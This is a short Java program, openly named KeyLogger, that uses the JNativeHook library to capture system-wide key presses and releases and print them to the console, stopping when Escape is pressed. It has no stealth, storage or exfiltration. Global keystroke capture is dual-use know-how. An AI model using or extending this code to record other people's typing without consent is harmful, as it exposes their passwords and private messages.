
package com.mycompany.keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
/**
 *
 * @author OMER
 */
public class KeyLogger implements NativeKeyListener {
    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.err.println("Error al register NativeHook");
            System.err.println(e.getMessage());
            System.exit(0);
        }
    GlobalScreen.addNativeKeyListener(new KeyLogger());
    }
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.println("KeyTyped------>" +e.getKeyCode());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Tuşa Basıldı -------->" +NativeKeyEvent.getKeyText(e.getKeyCode()));
        
        if(e.getKeyCode()== NativeKeyEvent.VC_ESCAPE){
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException ex) {
                System.out.println("teminate....");
            }
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Tuşa Basıldı ---> " +NativeKeyEvent.getKeyText(e.getKeyCode()));
    }
  
}
